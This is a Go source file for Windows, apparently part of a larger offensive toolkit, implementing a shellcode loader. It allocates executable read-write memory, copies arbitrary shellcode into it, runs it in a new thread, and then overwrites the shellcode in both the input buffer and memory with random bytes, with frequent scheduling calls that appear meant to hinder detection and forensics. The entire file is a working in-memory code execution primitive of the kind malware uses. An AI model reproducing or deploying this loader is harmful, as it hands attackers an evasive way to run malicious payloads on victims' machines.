// +build windows

package shellcode

import (
	"sync"
	"syscall"
	"unsafe"

	"github.com/pkg/errors"

	"project/internal/random"
)

var (
	initFindProcThreadOnce sync.Once

	tVirtualAlloc        *syscall.Proc
	tCreateThread        *syscall.Proc
	tWaitForSingleObject *syscall.Proc
	tVirtualFree         *syscall.Proc

	initThreadErr error
)

func initFindProcThread() {
	schedule()
	var kernel32 *syscall.DLL
	kernel32, initThreadErr = syscall.LoadDLL("kernel32.dll")
	if initThreadErr != nil {
		return
	}

	procMap := [4]*struct {
		proc **syscall.Proc
		name string
	}{
		{
			&tVirtualAlloc,
			"VirtualAlloc",
		},
		{
			&tCreateThread,
			"CreateThread",
		},
		{
			&tWaitForSingleObject,
			"WaitForSingleObject",
		},
		{
			&tVirtualFree,
			"VirtualFree",
		},
	}

	for i := 0; i < 4; i++ {
		schedule()
		proc, err := kernel32.FindProc(procMap[i].name)
		if err != nil {
			initThreadErr = err
			return
		}
		schedule()
		*procMap[i].proc = proc
	}
}

// CreateThread is used to create thread to execute shellcode
// it will block until shellcode exit, so usually need create
// a goroutine to execute CreateThread
func CreateThread(shellcode []byte) error {
	l := len(shellcode)
	if l == 0 {
		return errors.New("no data")
	}

	initFindProcThreadOnce.Do(initFindProcThread)
	if initThreadErr != nil {
		return errors.WithStack(initThreadErr)
	}

	// allocate memory
	// https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants
	const (
		memCommit            = uintptr(0x1000)
		memReserve           = uintptr(0x2000)
		pageExecuteReadWrite = uintptr(0x40)
		memRelease           = uintptr(0x8000)
	)
	schedule()
	memAddr, _, err := tVirtualAlloc.Call(0, uintptr(l),
		memReserve|memCommit, pageExecuteReadWrite)
	if memAddr == 0 {
		return errors.WithStack(err)
	}

	// copy shellcode
	rand := random.New(0)
	count := 0
	for i := 0; i < l; i++ {
		if count > 32 {
			schedule()
			count = 0
		} else {
			count += 1
		}
		// set shellcode
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
		*b = shellcode[i]

		// clean shellcode
		shellcode[i] = byte(rand.Int64())
	}

	// execute shellcode
	schedule()
	threadAddr, _, err := tCreateThread.Call(0, 0, memAddr, 0, 0, 0)
	if threadAddr == 0 {
		return errors.WithStack(err)
	}
	schedule()
	_, _, _ = tWaitForSingleObject.Call(threadAddr, 0xFFFFFFFF)

	// cover shellcode and free allocated memory
	schedule()
	rand = random.New(0)
	for i := 0; i < l; i++ {
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
		*b = byte(rand.Int64())
	}
	_, _, _ = tVirtualFree.Call(memAddr, 0, memRelease)

	schedule()
	return nil
}
